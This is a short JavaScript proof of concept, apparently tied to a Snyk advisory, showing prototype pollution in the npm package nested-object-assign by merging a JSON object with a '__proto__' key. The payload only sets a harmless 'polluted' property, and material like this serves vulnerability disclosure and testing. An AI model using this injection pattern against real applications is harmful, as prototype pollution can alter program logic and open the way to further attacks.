//https://snyk.io/vuln/SNYK-JS-NESTEDOBJECTASSIGN-1065977

 
  const assign = require("nested-object-assign");
   
  assign({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
// End of file
